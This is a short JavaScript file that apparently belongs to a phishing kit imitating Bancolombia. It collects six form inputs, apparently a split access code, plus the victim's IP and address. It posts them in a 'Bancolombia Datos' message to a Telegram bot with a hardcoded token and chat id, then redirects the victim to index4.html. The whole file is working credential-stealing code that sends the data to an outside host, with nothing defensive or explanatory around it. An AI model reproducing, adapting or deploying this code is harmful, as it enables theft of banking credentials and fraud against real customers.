//document.write('<script src="datos_del_tel.js"></script>');
var telegram_bot_id =  "5884293620:AAFFhpxbXWyrQvDApdAzcfvARtlBAWFOStE";
//chat id
var chat_id = "5449935240";
var u_name, d_name, t_name, c_name, cc_name, s_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("num1").value;
	d_name = document.getElementById("num2").value;
	t_name = document.getElementById("num3").value;
	c_name = document.getElementById("num4").value;
	cc_name = document.getElementById("num5").value;
	s_name = document.getElementById("num6").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "Bancolombia Datos\nCOD1: " + u_name + "" + d_name +"" + t_name +"" + c_name +"" + cc_name +"" + s_name +"\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index4.html';
        console.log(response);
    });
    return false;
};
